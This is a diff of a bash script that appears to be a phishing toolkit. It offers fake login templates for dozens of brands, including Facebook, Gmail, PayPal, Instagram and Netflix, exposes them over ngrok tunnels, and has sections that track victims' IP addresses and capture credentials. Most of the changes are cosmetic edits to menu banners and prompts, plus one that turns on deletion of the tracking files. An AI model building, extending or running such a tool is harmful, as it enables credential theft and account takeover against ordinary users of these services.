@@ -170,7 +170,7 @@ sbanner(){
 
 ## Update Prompt
 uprompt(){
-        prompt="$(echo -e "${GREEN}>> ${ULYELLOW}${selected} :${NA} ${BLUE}")"
+        prompt="$(echo -e "${GREEN}>> ${ULYELLOW}${selected}${NF} :${NA} ${BLUE}")"
 }
 
 ## Directories
@@ -359,7 +359,6 @@ load_anim() {
         done
     done
 }
-
 load_print() {
         load_anim "${1}" &
         p=$!
@@ -469,7 +468,8 @@ start_ngrok() {
 	N | n | *)
 		echo -e " ";;
 	esac
-        load_print "Launching NGROK" '15'
+        #load_print "Launching NGROK" '15'
+        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
     else
@@ -1057,8 +1057,8 @@ ip_details() {
 		echo -e "${GREEN} State: ${NC} $region"
 	fi
 	cat track.txt >> "${log_name}.txt"
-##	rm -rf track.txt
-##	rm -rf rawtrack.txt
+	rm -rf track.txt
+	rm -rf rawtrack.txt
 }
 
 ## Get credentials
@@ -1166,6 +1166,9 @@ tunnelmenu() {
 clear
 banner
 echo -e " "
+echo -e "${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
+echo -e "${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA} ${GREEN}((${NA}"
+echo -e ""
 echo -e "${ULWHITE}${BOLDWHITE}CHOOSE A TUNNEL TYPE${NF} : ${NC}"
 echo -e " "
 echo -e "${RED}[${WHITE}01${RED}]${YELLOW} Localhost    ${RED}[${CYAN}For Devs${RED}]"
@@ -1397,7 +1400,7 @@ site_adobe(){
 siname="Adobe"
 rdurl="www.adobe.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1434,7 +1437,7 @@ site_airtelxstream(){
 siname="AirtelXStream"
 rdurl="www.airtelxstream.in"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1463,7 +1466,7 @@ site_ajio(){
 siname="AJIO"
 rdurl="www.ajio.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1492,7 +1495,7 @@ site_amazon(){
 siname="Amazon"
 rdurl="www.amazon.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1521,7 +1524,7 @@ site_apple(){
 siname="Apple"
 rdurl="www.apple.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1550,7 +1553,7 @@ site_badoo(){
 siname="Badoo"
 rdurl="badoo.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1587,7 +1590,7 @@ site_date(){
 siname="Date (Multiple phish)"
 rdurl="date.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1626,7 +1629,7 @@ site_devianart(){
 siname="Devian Art"
 rdurl="www.deviantart.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1662,7 +1665,7 @@ site_ebay(){
 siname="Ebay"
 rdurl="www.ebay.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1691,7 +1694,7 @@ site_facebook(){
 siname="Facebook"
 rdurl="www.facebook.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1745,7 +1748,7 @@ site_flipcart(){
 siname="Flipcart"
 rdurl="www.flipcart.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1781,7 +1784,7 @@ site_github(){
 siname="GitHub"
 rdurl="www.github.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1820,7 +1823,7 @@ site_gitlab(){
 siname="GitLab"
 rdurl="www.gitlab.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1859,7 +1862,7 @@ site_gmail(){
 siname="Gmail"
 rdurl="www.gmail.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1888,7 +1891,7 @@ site_google(){
 siname="Google"
 rdurl="www.gmail.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1937,7 +1940,7 @@ site_gpay(){
 siname="Gpay"
 rdurl="pay.google.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -1973,7 +1976,7 @@ site_instagram(){
 siname="Instagram"
 rdurl="www.instagram.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2060,7 +2063,7 @@ site_jio(){
 siname="JIO"
 rdurl="www.jio.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2089,7 +2092,7 @@ site_linkedin(){
 siname="Linkedin"
 rdurl="linkedin.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2118,7 +2121,7 @@ site_mediafire(){
 siname="Medifire"
 rdurl="www.mediafire.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2147,7 +2150,7 @@ site_messenger(){
 siname="Messenger"
 rdurl="www.messenger.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2186,7 +2189,7 @@ site_microsoft(){
 siname="Microsoft"
 rdurl="www.microsoft.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2223,7 +2226,7 @@ site_myspace(){
 siname="MySpace"
 rdurl="myspace.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2252,7 +2255,7 @@ site_netflix(){
 siname="Netflix"
 rdurl="www.netflix.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2297,7 +2300,7 @@ site_paypal(){
 siname="Paypal"
 rdurl="www.paypal.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2326,7 +2329,7 @@ site_paytm(){
 siname="Paytm"
 rdurl="paytm.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2381,7 +2384,7 @@ site_playstation(){
 siname="PlayStation"
 rdurl="www.playstation.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2455,7 +2458,7 @@ site_reddit(){
 siname="Reddit"
 rdurl="www.reddit.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2484,7 +2487,7 @@ site_shopify(){
 siname="Shopify"
 rdurl="www.shopify.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2513,7 +2516,7 @@ site_snapchat(){
 siname="Snapchat"
 rdurl="www.snapchat.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2542,7 +2545,7 @@ site_socialclub(){
 siname="SocialClub"
 rdurl="socialclub.rockstargames.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2571,7 +2574,7 @@ site_spotify(){
 siname="Spotify"
 rdurl="www.spotify.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2600,7 +2603,7 @@ site_stackoverflow(){
 siname="Stackoverflow"
 rdurl="stackoverflow.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2629,7 +2632,7 @@ site_steam(){
 siname="Steam"
 rdurl="store.steampowered.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2682,7 +2685,7 @@ site_tiktok(){
 siname="TikTok"
 rdurl="www.tiktok.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2745,7 +2748,7 @@ site_twitter(){
 siname="Twitter"
 rdurl="twitter.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2774,7 +2777,7 @@ site_ubereats(){
 siname="ubereats"
 rdurl="www.ubereats.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2803,7 +2806,7 @@ site_verizon(){
 siname="Verizon"
 rdurl="www.verizon.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2840,7 +2843,7 @@ site_vk(){
 siname="VK"
 rdurl="vk.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2882,7 +2885,7 @@ site_wordpress(){
 siname="Wordpress"
 rdurl="wordpress.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2911,7 +2914,7 @@ site_xbox(){
 siname="Xbox"
 rdurl="www.xbox.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2940,7 +2943,7 @@ site_yahoo(){
 siname="Yahoo"
 rdurl="yahoo.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2969,7 +2972,7 @@ site_yandex(){
 siname="Yandex"
 rdurl="yandex.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -2998,7 +3001,7 @@ site_ytsubs(){
 siname="YT subs"
 rdurl="www.youtube.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
@@ -3028,7 +3031,7 @@ site_discord(){
 siname="Discord"
 rdurl="www.discord.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+echo -e "${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA} ${GREEN}((${NA}"
 echo -e ""
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
 echo -e ""
